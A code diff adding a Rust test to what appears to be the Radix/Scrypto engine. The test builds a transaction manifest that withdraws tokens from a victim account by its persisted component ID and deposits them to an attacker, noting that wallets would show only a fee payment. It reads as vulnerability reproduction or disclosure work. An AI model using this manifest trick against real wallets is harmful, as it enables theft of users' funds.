@@ -220,3 +220,39 @@ fn assert_resource_changes_for_transfer(
             && r.component_id == target_account
             && r.amount == Decimal::from(transfer_amount)));
 }
+
+#[test]
+fn test_manifest_can_refer_to_component_by_persisted_id_which_can_be_abused_by_attacker() {
+    // Arrange
+    let mut store = TypedInMemorySubstateStore::with_bootstrap();
+    let mut test_runner = TestRunner::new(true, &mut store);
+    let (victim_public_key, _, victim_account) = test_runner.new_allocated_account();
+    let (_, _, attacker_account) = test_runner.new_allocated_account();
+
+    let victim_account_component_id = [13, 128, 107, 68, 165, 235, 10, 246, 215, 211, 89, 189, 91, 52, 129, 83, 148, 118, 215, 152, 132, 64, 184, 211, 168, 40, 238, 48, 30, 131, 239, 66, 4, 4, 0, 0];
+
+    // Act
+    let mut builder = ManifestBuilder::new(&NetworkDefinition::simulator());
+    let builder = builder.lock_fee(victim_account, dec!("10"));
+    // NOTE - the following line is not flagged in the wallet - it just looks like we're paying a fee!
+    let (builder, _, _) = builder
+        .add_instruction(Instruction::CallMethod { method_ident: ScryptoMethodIdent {
+            receiver: ScryptoReceiver::Component(victim_account_component_id),
+            method_name: "withdraw".to_string(),
+        }, args: args!(RADIX_TOKEN) });
+
+    let manifest = builder
+        .call_method(
+            attacker_account,
+            "deposit_batch",
+            args!(Expression::entire_worktop()),
+        )
+        .build();
+    let receipt = test_runner.execute_manifest(
+        manifest,
+        vec![NonFungibleAddress::from_public_key(&victim_public_key)],
+    );
+
+    // Assert
+    receipt.expect_commit_success();
+}
